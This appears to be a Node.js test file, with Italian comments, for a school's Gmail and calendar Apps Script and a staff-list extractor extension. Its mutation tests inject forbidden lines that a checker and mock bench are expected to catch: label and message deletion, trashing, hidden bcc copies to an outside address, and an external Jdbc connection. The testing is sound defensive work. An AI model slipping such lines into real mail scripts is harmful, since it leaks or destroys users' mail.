  // togliere un filtro si', ma solo i filtri scelti, dentro EXTRA_togliFiltri
  const TOGLI = 'Gmail.Users.Settings.Filters.remove(';
  const togliDiOggi = smonta(posta).codice.split(TOGLI).length - 1;
  verifica('il motore di oggi toglie i filtri (' + togliDiOggi + ' chiamata), e il controllo lo lascia fare ' +
    'solo li\'', togliDiOggi >= 1 && controlla('Organizzazione_Gmail.gs', posta).length === 0);
  const fuoriPosto = inserisci(posta, INIZIO, '\n  Gmail.Users.Settings.Filters.remove(\'me\', \'F1\');');
  deveFallire('Organizzazione_Gmail.gs', 'un filtro tolto fuori da EXTRA_togliFiltri viene trovato',
    fuoriPosto, 'Gmail.Users.Settings.Filters.remove fuori da EXTRA_togliFiltri');
  deveFallire('Organizzazione_Gmail.gs', 'ed e\' anche una cancellazione non ammessa',
    fuoriPosto, 'cancellazione non ammessa: remove');
  deveFallire('Organizzazione_Gmail.gs', 'anche in una funzione nuova con un nome quasi uguale',
    posta + '\nfunction EXTRA_togliFiltriTutti() {\n  Gmail.Users.Settings.Filters.remove(\'me\', \'F1\');\n}\n',
    'Gmail.Users.Settings.Filters.remove fuori da EXTRA_togliFiltri');
  deveFallire('Organizzazione_Gmail.gs', 'o in una seconda _togliFiltri_, che prenderebbe il posto di quella vera',
    posta + '\nfunction _togliFiltri_() {\n  Gmail.Users.Settings.Filters.remove(\'me\', \'F1\');\n}\n',
    'la funzione _togliFiltri_ e\' dichiarata 2 volte');
  deveFallire('Organizzazione_Gmail.gs', 'e con il nome calcolato, anche dentro EXTRA_togliFiltri',
    inserisci(posta, DENTRO_TOGLI, '\n  Gmail.Users.Settings.Filters[\'re\' + \'move\'](\'me\', \'F1\');'),
    'servizio Gmail chiamato con un nome calcolato');
  // dentro EXTRA_togliFiltri resta vietato tutto il resto: etichette e messaggi
  deveFallire('Organizzazione_Gmail.gs', 'un\'etichetta cancellata con il servizio Gmail dentro EXTRA_togliFiltri viene trovata',
    inserisci(posta, DENTRO_TOGLI, '\n  Gmail.Users.Labels.remove(\'me\', \'Label_1\');'),
    'servizio Gmail non ammesso: Gmail.Users.Labels.remove');
  deveFallire('Organizzazione_Gmail.gs', 'ed e\' una cancellazione non ammessa anche li\'',
    inserisci(posta, DENTRO_TOGLI, '\n  Gmail.Users.Labels.remove(\'me\', \'Label_1\');'),
    'cancellazione non ammessa: remove');
  deveFallire('Organizzazione_Gmail.gs', 'e anche Gmail.Users.Labels.delete, li\' dentro',
    inserisci(posta, DENTRO_TOGLI, '\n  Gmail.Users.Labels.delete(\'me\', \'Label_1\');'),
    'servizio Gmail non ammesso: Gmail.Users.Labels.delete');
  deveFallire('Organizzazione_Gmail.gs', 'e GmailApp.deleteLabel, li\' dentro',
    inserisci(posta, DENTRO_TOGLI, '\n  GmailApp.deleteLabel(GmailApp.getUserLabelByName(\'Famiglie\'));'),
    'cancellazione non ammessa: deleteLabel');
  deveFallire('Organizzazione_Gmail.gs', 'e un messaggio cancellato con il servizio Gmail, li\' dentro',
    inserisci(posta, DENTRO_TOGLI, '\n  Gmail.Users.Messages.remove(\'me\', \'M1\');'),
    'servizio Gmail non ammesso: Gmail.Users.Messages.remove');
  deveFallire('Organizzazione_Gmail.gs', 'o messo nel cestino, li\' dentro',
    inserisci(posta, DENTRO_TOGLI, '\n  GmailApp.search(\'label:Famiglie\')[0].moveToTrash();'), 'cestino');
  // e chi le chiama: EXTRA_togliFiltri solo il docente, _togliFiltri_ solo EXTRA_togliFiltri
  deveFallire('Organizzazione_Gmail.gs', '_togliFiltri_ chiamata dallo smistamento di ogni ora viene trovata',
    inserisci(posta, 'function smistaNuoviMessaggi() {',
              '\n  if (_servizioFiltri_()) _togliFiltri_(_vociFiltri_(_config_()).buone, false);'),
    '_togliFiltri_ usata fuori da EXTRA_togliFiltri');
  deveFallire('Organizzazione_Gmail.gs', 'EXTRA_togliFiltri chiamata dal riordino viene trovata',
    inserisci(posta, 'function PASSO_3_riordinaPostaEsistente(e) {', '\n  EXTRA_togliFiltri();'),
    'EXTRA_togliFiltri chiamata o nominata nel codice');
  deveFallire('Organizzazione_Gmail.gs', '_togliFiltri_ presa come valore viene trovata',
    inserisci(posta, INIZIO, '\n  var t = _togliFiltri_;'), '_togliFiltri_ usata fuori da EXTRA_togliFiltri');
  deveFallire('Organizzazione_Gmail.gs', 'anche dentro EXTRA_togliFiltri, se non e\' una chiamata',
    inserisci(posta, 'function EXTRA_togliFiltri() {', '\n  var t = _togliFiltri_;'),
    '_togliFiltri_ usata fuori da EXTRA_togliFiltri');
  deveFallire('Organizzazione_Gmail.gs', 'e un trigger che esegue EXTRA_togliFiltri viene trovato',
    inserisci(posta, 'function PASSO_4_attivaAutomazione() {',
              '\n  ScriptApp.newTrigger(\'EXTRA_togliFiltri\').timeBased().everyHours(1).create();'),
    'il nome EXTRA_togliFiltri da solo fra virgolette');
  // la tabella dei testi delle azioni: TRASH, SPAM e forward solo li', solo testi,
  // e letti per chiave solo dalla copia del filtro
  const TABELLA = 'STARRED: \'Aggiungi stella\',';
  deveFallire('Organizzazione_Gmail.gs', 'un valore che non e\' un testo nella tabella delle azioni viene trovato',
    sostituisci(posta, TABELLA, 'STARRED: GmailApp.search(\'in:inbox\'),'), 'non e\' fatta solo di testi');
  deveFallire('Organizzazione_Gmail.gs', 'e un testo scritto a pezzi',
    sostituisci(posta, TABELLA, 'STARRED: \'Aggiungi \' + \'stella\','), 'non e\' fatta solo di testi');
  deveFallire('Organizzazione_Gmail.gs', 'e un gruppo in piu\' nella tabella',
    sostituisci(posta, 'altro: {', 'crea: { TRASH: \'x\' },\n  altro: {'), 'non e\' fatta solo di testi');
  deveFallire('Organizzazione_Gmail.gs', 'e quando la tabella non vale, i nomi vietati dentro si vedono',
    sostituisci(posta, TABELLA, 'STARRED: GmailApp.search(\'in:inbox\'),'), 'cestino (trash)');
  deveFallire('Organizzazione_Gmail.gs', 'la tabella letta fuori dalla copia del filtro viene trovata',
    inserisci(posta, INIZIO, '\n  var chiavi = Object.keys(_AZIONI_A_PAROLE.aggiunge);'), '_AZIONI_A_PAROLE usata fuori da _copiaFiltro_');
  deveFallire('Organizzazione_Gmail.gs', 'e le sue chiavi prese come valori, anche dentro la copia',
    inserisci(posta, 'function _copiaFiltro_(filtro, etichette) {', '\n  for (var x in _AZIONI_A_PAROLE.aggiunge) {}'),
    '_AZIONI_A_PAROLE letta non per chiave');
  deveFallire('Organizzazione_Gmail.gs', 'e una seconda tabella con lo stesso nome',
    posta + '\nvar _AZIONI_A_PAROLE = { aggiunge: { TRASH: \'x\' } };\n', 'dichiarata 2 volte');
  // i servizi sono un elenco di quelli ammessi, file per file: uno nuovo che
  // scrive nel Drive o parla con un altro server fallisce anche se nessuno
  // l'aveva previsto
  deveFallire('Organizzazione_Gmail.gs', 'un foglio creato nel Drive (SpreadsheetApp) viene trovato',
    inserisci(posta, INIZIO, '\n  SpreadsheetApp.create(\'Personale\').getActiveSheet().appendRow(_config_().personale);'),
    'servizio non ammesso: SpreadsheetApp');
  deveFallire('Organizzazione_Gmail.gs', 'un documento creato nel Drive (DocumentApp) viene trovato',
    inserisci(posta, INIZIO, '\n  DocumentApp.create(\'Elenco\');'), 'servizio non ammesso: DocumentApp');
  deveFallire('Organizzazione_Gmail.gs', 'una connessione a un database esterno (Jdbc) viene trovata',
    inserisci(posta, INIZIO, '\n  Jdbc.getConnection(\'jdbc:mysql://esempio.example:3306/db\');'),
    'servizio non ammesso: Jdbc');
  deveFallire('Organizzazione_Gmail.gs', 'un servizio preso senza chiamarlo subito viene trovato',
    inserisci(posta, INIZIO, '\n  var foglio = SpreadsheetApp; foglio[\'create\'](\'x\');'),
    'servizio non ammesso: SpreadsheetApp');
  deveFallire('Organizzazione_Gmail.gs', 'il calendario, ammesso solo negli orari, nella posta viene trovato',
    inserisci(posta, INIZIO, '\n  CalendarApp.getDefaultCalendar();'), 'servizio non ammesso: CalendarApp');
  deveFallire('Organizzazione_Gmail.gs', 'una copia nascosta con la chiave fra virgolette viene trovata',
    sostituisci(posta, '\'[Organizzazione Gmail] \' + oggetto, corpo);',
                '\'[Organizzazione Gmail] \' + oggetto, corpo, { \'bcc\': \'collega@scuola-esempio.edu.it\' });'),
    'copia nascosta (bcc)');
  deveFallire('Organizzazione_Gmail.gs', 'una copia nascosta aggiunta dopo (o.bcc = ...) viene trovata',
    sostituisci(posta, 'MailApp.sendEmail(_mioIndirizzo_(), \'[Organizzazione Gmail] \' + oggetto, corpo);',
                'var o = {}; o.bcc = \'collega@scuola-esempio.edu.it\'; ' +
                'MailApp.sendEmail(_mioIndirizzo_(), \'[Organizzazione Gmail] \' + oggetto, corpo, o);'),
    'copia nascosta (bcc)');
  const commentato = inserisci(posta, INIZIO, '\n  // UrlFetchApp.fetch(\'x\'); moveToTrash(); /* bcc: tutti */');
  verifica('ma un UrlFetchApp in un commento non conta',
    commentato !== null && controlla('Organizzazione_Gmail.gs', commentato).length === 0);

  const orari = sorgenti['Orari.gs'];
  deveFallire('Orari.gs', 'un destinatario estraneo negli orari viene trovato',
    sostituisci(orari, 'to: m.a,', 'to: \'collega@scuola-esempio.edu.it\','), 'destinatario non ammesso');
  deveFallire('Orari.gs', 'un calendario cancellato viene trovato',
    inserisci(orari, 'function ORARI_ANNULLA_calendario() {', '\n  CalendarApp.getDefaultCalendar().deleteCalendar();'),
    'cancellazione non ammessa: deleteCalendar');
  deveFallire('Orari.gs', 'gli invitati a un evento vengono trovati',
    inserisci(orari, 'function ORARI_4_calendario(e) {', '\n  var opzioni = { guests: \'collega@scuola-esempio.edu.it\' };'),
    'invitati');
  deveFallire('Orari.gs', 'un foglio creato nel Drive dagli orari viene trovato',
    inserisci(orari, 'function ORARI_4_calendario(e) {', '\n  SpreadsheetApp.create(\'Orari\');'),
    'servizio non ammesso: SpreadsheetApp');
  deveFallire('Orari.gs', 'una copia in cc negli orari, con la chiave fra virgolette, viene trovata',
    sostituisci(orari, 'to: m.a,', 'to: m.a, "cc": \'collega@scuola-esempio.edu.it\','), 'copia (cc)');
}

// ---------------------------------------------------------------------------
//  3. IL BANCO DELLA POSTA SI ACCORGE DI UN DESTINATARIO ESTRANEO
//  Lo stesso guasto, ma nel motore che gira nel banco: test/mock_apps_script.js
//  controlla ogni email mandata durante le prove.
// ---------------------------------------------------------------------------
function bancoConGuasti() {
  intestazione('IL BANCO DELLA POSTA, SU UNA COPIA TEMPORANEA DEL MOTORE');
  const cartella = fs.mkdtempSync(path.join(os.tmpdir(), 'campanella-posta-invarianti-'));
  const banco = path.join(__dirname, 'mock_apps_script.js');
  const esempio = path.join(__dirname, 'Configurazione_esempio.gs');
  const posta = sorgenti['Organizzazione_Gmail.gs'];
  function esitoBanco(nome, motore) {
    if (motore === null) return null;
    const file = path.join(cartella, nome);
    fs.writeFileSync(file, motore);
    const r = figlio.spawnSync(process.execPath, [banco, esempio, file], { encoding: 'utf8' });
    return r.status;
  }
  try {
    verifica('il motore di oggi, copiato, passa il banco', esitoBanco('uguale.gs', posta) === 0);
    const RIGA = 'MailApp.sendEmail(_mioIndirizzo_(), \'[Organizzazione Gmail] \' + oggetto, corpo);';
    const estraneo = sostituisci(posta, RIGA,
      RIGA + '\n    MailApp.sendEmail(\'collega@scuola-esempio.edu.it\', oggetto, corpo);');
    const s1 = esitoBanco('estraneo.gs', estraneo);
    verifica('con un destinatario estraneo il banco fallisce', s1 !== null && s1 !== 0);
    const inCopia = sostituisci(posta, RIGA,
      'MailApp.sendEmail(_mioIndirizzo_(), \'[Organizzazione Gmail] \' + oggetto, corpo, ' +
      '{ bcc: \'collega@scuola-esempio.edu.it\' });');
    const s2 = esitoBanco('bcc.gs', inCopia);
    verifica('con una copia nascosta il banco fallisce', s2 !== null && s2 !== 0);
    // EXTRA_togliFiltri: la copia nel registro prima di togliere, e solo i filtri scelti
    const senzaCopia = sostituisci(posta, 'Logger.log(\'COPIA DEL FILTRO CHE STO PER TOGLIERE.',
                                          'String(\'COPIA DEL FILTRO CHE STO PER TOGLIERE.');
    const s3 = esitoBanco('senzacopia.gs', senzaCopia);
    verifica('se un filtro si toglie senza scriverne prima la copia il banco fallisce', s3 !== null && s3 !== 0);
    const altraEtichetta = sostituisci(posta, 'if (!sua) return false;', 'sua = true;');
    const s4 = esitoBanco('etichetta.gs', altraEtichetta);
    verifica('se si toglie anche un filtro che mette un\'altra etichetta il banco fallisce', s4 !== null && s4 !== 0);
    const unoInPiu = sostituisci(posta,
      'if (!Object.prototype.hasOwnProperty.call(voce.criteri, k) || criteri[k] !== voce.criteri[k]) return false;',
      'if (Object.prototype.hasOwnProperty.call(voce.criteri, k) && criteri[k] !== voce.criteri[k]) return false;');
    const s5 = esitoBanco('inpiu.gs', unoInPiu);
    verifica('e anche se si toglie un filtro con un criterio in piu\'', s5 !== null && s5 !== 0);
  } finally {
    fs.rmSync(cartella, { recursive: true, force: true });
  }
}

// ---------------------------------------------------------------------------
//  4. GLI ESTRATTORI DEL PERSONALE
//  L'estensione per Chrome e la funzione da console leggono la stessa pagina
//  del registro. Qui girano su una pagina finta, con persone inventate: la
//  funzione da console non deve lasciare file nei download quando gli appunti
//  funzionano (A-19).
// ---------------------------------------------------------------------------
const FILE_CONSOLE = path.join(risorse, 'estrai_personale_spaggiari.js');

const PERSONE = [
  { nome: 'ROSSI MARIO', ruolo: 'DOCENTE LAUREATO SCUOLA SECONDARIA II GRADO', email: 'mario.rossi@scuola-esempio.edu.it' },
  { nome: 'DE LUCA ANNA', ruolo: 'ASSISTENTE AMMINISTRATIVO', email: 'anna.deluca@scuola-esempio.edu.it' },
  { nome: 'VERDI GIUSEPPE', ruolo: 'COLLABORATORE SCOLASTICO', email: '' },
  { nome: 'BLU CARLA', ruolo: 'ASSISTENTE TECNICO', email: 'carla.blu@scuola-esempio.edu.it' },
  { nome: 'GRIGI SARA', ruolo: 'DIRIGENTE SCOLASTICO', email: 's.grigi@scuola-esempio.edu.it' },
  { nome: 'VIOLA TIZIO', ruolo: '', email: '' }
];

/**
 * Una pagina del personale finta, con solo quello che i due estrattori
 * leggono. "appunti" dice quali strade per gli appunti funzionano: copy() della
 * console, navigator.clipboard, execCommand('copy').
 */
function paginaFinta(host, persone, appunti) {
  appunti = appunti || {};
  const esito = { scorrimenti: 0, scaricati: [], copiato: null, scritte: [] };
  const contenitori = persone.map((p, i) => ({
    getAttribute: n => (n === 'account_id' ? 'id' + i : null),
    querySelector: sel => {
      if (sel === '.sing_user_nominativo') return { textContent: '\n  ' + p.nome + '  ' };
      if (sel === '.sing_user_ruolo') return p.ruolo ? { textContent: p.ruolo } : null;
      if (sel === 'a[href^="mailto:"]') return p.email ? { getAttribute: () => 'mailto:' + p.email } : null;
      return null;
    },
    innerText: p.nome + '\n' + (p.ruolo || ''),
    classList: { contains: () => false }
  }));
  let areaDiTesto = null;
  const scrivi = (...a) => { esito.scritte.push(a.join(' ')); };
  const globali = {
    document: {
      body: { scrollHeight: 5000, appendChild: () => {} },
      querySelectorAll: sel => (sel === '[account_id]' ? contenitori : []),
      createElement: tag => {
        const el = { tag, style: {}, remove: () => {}, select: () => {} };
        el.click = () => { if (tag === 'a' && el.download) esito.scaricati.push(el.download); };
        if (tag === 'textarea') areaDiTesto = el;
        return el;
      },
      execCommand: () => {
        if (!appunti.execCommand) return false;
        esito.copiato = areaDiTesto && areaDiTesto.value;
        return true;
      }
    },
    window: { scrollTo: () => { esito.scorrimenti++; } },
    location: { hostname: host },
    navigator: { clipboard: { writeText: t => {
      if (!appunti.navigatore) return Promise.reject(new Error('permesso negato'));
      esito.copiato = t;
      return Promise.resolve();
    } } },
    setTimeout: f => { f(); return 0; },
    URL: { createObjectURL: () => 'blob:finto', revokeObjectURL: () => {} },
    Blob: function Blob(parti) { this.parti = parti; },
    console: { log: scrivi, warn: scrivi, table: () => {} }
  };
  if (appunti.copy) globali.copy = t => { esito.copiato = t; };
  return { contesto: vm.createContext(globali), esito };
}

/** Esegue la funzione da console nella pagina finta, come dopo Invio nella Console. */
async function eseguiConsole(pagina, file) {
  const codice = fs.readFileSync(file || FILE_CONSOLE, 'utf8');
  return await vm.runInContext(codice, pagina.contesto, { filename: 'estrai_personale_spaggiari.js' });
}

const FILE_POPUP = path.join(risorse, 'estensione_personale', 'popup.js');

/**
 * Apre il popup dell'estensione su una scheda con quell'indirizzo. "risposta"
 * e' quello che torna dalla pagina dopo executeScript (se manca, niente).
 */
function apriPopup(indirizzo, risposta) {
  const elemento = () => ({ value: '', disabled: true, textContent: '', className: '', addEventListener: () => {} });
  const elementi = { risultato: elemento(), copiaBtn: elemento(), stato: elemento() };
  const eseguiti = [];
  const chrome = {
    runtime: {},
    tabs: { query: (q, cb) => cb([{ id: 7, url: indirizzo }]) },
    scripting: { executeScript: (opzioni, cb) => {
      eseguiti.push(opzioni);
      if (risposta !== undefined) cb([{ result: risposta }]);
    } }
  };
  const contesto = vm.createContext({ document: { getElementById: id => elementi[id] }, chrome, navigator: {}, URL });
  vm.runInContext(fs.readFileSync(FILE_POPUP, 'utf8'), contesto, { filename: 'popup.js' });
  return { elementi, eseguiti, contesto };
}

/** La funzione che l'estensione inietta, eseguita dentro la pagina finta come fa Chrome. */
function sorgenteEstensione() {
  return apriPopup('https://web.spaggiari.eu/').contesto.estraiPersonale.toString();
}
async function eseguiEstensione(pagina) {
  return await vm.runInContext('(' + sorgenteEstensione() + ')()', pagina.contesto);
}

/**
 * La categoria che estensione e funzione da console danno a ogni ruolo, lette
 * dal loro elenco su una pagina finta con una persona per ruolo.
 */
async function categorieJs(ruoli) {
  const persone = ruoli.map((r, i) => ({ nome: 'PERSONA ' + (100 + i), ruolo: r, email: '' }));
  const daTesto = testo => {
    const per = {};
    testo.split('\n').slice(1).forEach(riga => { const c = riga.split('\t'); per[c[0]] = c[3]; });
    return persone.map(p => per[p.nome]);
  };
  const p1 = paginaFinta('web.spaggiari.eu', persone, {});
  const estensione = daTesto((await eseguiEstensione(p1)).testo);
  const p2 = paginaFinta('web.spaggiari.eu', persone, { copy: true });
  await eseguiConsole(p2);
  return { estensione, console: daTesto(p2.esito.copiato) };
}

// i ruoli del registro, con qualche variante: la stessa lista la usa
// test/prova_personale.ps1 per il confronto con Stato.CategoriaRuolo
const RUOLI = [
  'DOCENTE LAUREATO SCUOLA SECONDARIA II GRADO', 'DOCENTE DIPLOMATO SCUOLA SECONDARIA II GRADO',
  'DOCENTE DI RELIGIONE', 'INSEGNANTE TECNICO PRATICO (ITP)', 'EDUCATORE', 'PROFESSORE',
  'ASSISTENTE AMMINISTRATIVO', 'DIRETTORE SGA', 'D.S.G.A.', 'DIRETTORE DEI SERVIZI GENERALI E AMMINISTRATIVI',
  'SEGRETERIA DIDATTICA', 'ASSISTENTE TECNICO', 'TECNICO DI LABORATORIO', 'COLLABORATORE SCOLASTICO',
  'AUSILIARIO', 'DIRIGENTE SCOLASTICO', 'PRESIDE', 'Ruolo non specificato', 'STUDENTE', 'GENITORE'
];

async function estrattori() {
  intestazione('LA FUNZIONE DA CONSOLE: IL CSV SOLO SE GLI APPUNTI NON FUNZIONANO');
  const HOST = 'web.spaggiari.eu';

  const conCopy = paginaFinta(HOST, PERSONE, { copy: true });
  const risposta = await eseguiConsole(conCopy);
  verifica('legge tutte le persone', risposta === PERSONE.length + ' persone estratte');
  verifica('con gli appunti che funzionano copia l\'elenco',
    typeof conCopy.esito.copiato === 'string' && conCopy.esito.copiato.indexOf('NOMINATIVO\tRUOLO\tEMAIL\tCATEGORIA') === 0);
  verifica('e non scarica nessun file', conCopy.esito.scaricati.length === 0);

  const conNavigatore = paginaFinta(HOST, PERSONE, { navigatore: true });
  await eseguiConsole(conNavigatore);
  verifica('anche con navigator.clipboard: copiato, nessun file',
    conNavigatore.esito.copiato !== null && conNavigatore.esito.scaricati.length === 0);

  const senzaAppunti = paginaFinta(HOST, PERSONE, {});
  await eseguiConsole(senzaAppunti);
  verifica('senza appunti scarica il CSV, e solo allora',
    senzaAppunti.esito.scaricati.length === 1 && senzaAppunti.esito.scaricati[0] === 'personale_spaggiari.csv');
  verifica('e dice di cancellarlo dopo averlo usato',
    senzaAppunti.esito.scritte.some(s => /CANCELLA IL FILE/.test(s)));

  intestazione('L\'ESTENSIONE LAVORA SOLO SUL REGISTRO');
  const FUORI = /non e' la pagina del registro/;
  const altrove = apriPopup('https://www.esempio.example/pagina');
  verifica('su un altro sito non esegue niente nella pagina', altrove.eseguiti.length === 0);
  verifica('e lo dice', FUORI.test(altrove.elementi.stato.textContent));
  const imitazione = apriPopup('https://spaggiari.eu.esempio.example/personale');
  verifica('un sito che imita il nome non basta', imitazione.eseguiti.length === 0);
  const registro = apriPopup('https://web.spaggiari.eu/sif/app/default/personale', { righe: 2, conEmail: 1, testo: 'X' });
  verifica('sul registro esegue la lettura e mostra l\'elenco',
    registro.eseguiti.length === 1 && registro.elementi.risultato.value === 'X' &&
    registro.elementi.copiaBtn.disabled === false);
  const nascosto = apriPopup(undefined, { fuoriSito: true });
  verifica('se l\'indirizzo non si vede decide la pagina, e il popup lo dice',
    nascosto.eseguiti.length === 1 && FUORI.test(nascosto.elementi.stato.textContent));
  const paginaAltrove = paginaFinta('www.esempio.example', PERSONE, {});
  const r1 = await eseguiEstensione(paginaAltrove);
  verifica('dentro un\'altra pagina non scorre e non legge',
    r1 && r1.fuoriSito === true && paginaAltrove.esito.scorrimenti === 0);
  const paginaRegistro = paginaFinta(HOST, PERSONE, {});
  const r2 = await eseguiEstensione(paginaRegistro);
  verifica('sul registro legge tutte le persone', r2 && r2.righe === PERSONE.length && r2.conEmail === 4);
  const manifest = JSON.parse(fs.readFileSync(path.join(risorse, 'estensione_personale', 'manifest.json'), 'utf8'));
  verifica('il manifest chiede solo activeTab e scripting, nessun sito fisso',
    JSON.stringify((manifest.permissions || []).slice().sort()) === '["activeTab","scripting"]' &&
    !manifest.host_permissions && !manifest.content_scripts);

  intestazione('ESTENSIONE E FUNZIONE DA CONSOLE LEGGONO ALLO STESSO MODO');
  const selettori = testo => [...new Set([...testo.matchAll(/\b(?:querySelectorAll|querySelector|closest)\(\s*'([^']+)'/g)]
    .map(m => m[1]))].sort();
  const selEstensione = selettori(sorgenteEstensione());
  const selConsole = selettori(fs.readFileSync(FILE_CONSOLE, 'utf8'));
  verifica('gli stessi selettori della pagina del registro (' + selEstensione.join('  ') + ')',
    selEstensione.length >= 4 && JSON.stringify(selEstensione) === JSON.stringify(selConsole));
  const perConsole = paginaFinta(HOST, PERSONE, { copy: true });
  await eseguiConsole(perConsole);
  verifica('sulla stessa pagina lo stesso elenco, categorie comprese', perConsole.esito.copiato === r2.testo);
  const categorie = await categorieJs(RUOLI);
  verifica('la stessa categoria per ' + RUOLI.length + ' ruoli',
    JSON.stringify(categorie.estensione) === JSON.stringify(categorie.console) &&
    categorie.estensione.filter(c => c).length >= 15);
}

// ---------------------------------------------------------------------------
async function principale() {
  scriptDiOggi();
  provaDellaProva();
  bancoConGuasti();
  await estrattori();

  intestazione('RISULTATO');
  if (fallimenti === 0) {
    console.log('  Tutte le prove superate.');
  } else {
    console.log('  PROVE FALLITE: ' + fallimenti);
    process.exitCode = 1;
  }
}

module.exports = { smonta, controlla, paginaFinta, eseguiConsole, eseguiEstensione, categorieJs, PERSONE, RUOLI };
if (require.main === module) {
  if (process.argv[2] === '--categorie') {
    // per test/prova_personale.ps1: le categorie dei due estrattori, in JSON
    categorieJs(RUOLI).then(c => process.stdout.write(JSON.stringify({ ruoli: RUOLI, estensione: c.estensione, console: c.console })));
  } else {
    principale().catch(e => { console.error(e); process.exitCode = 1; });
  }
}
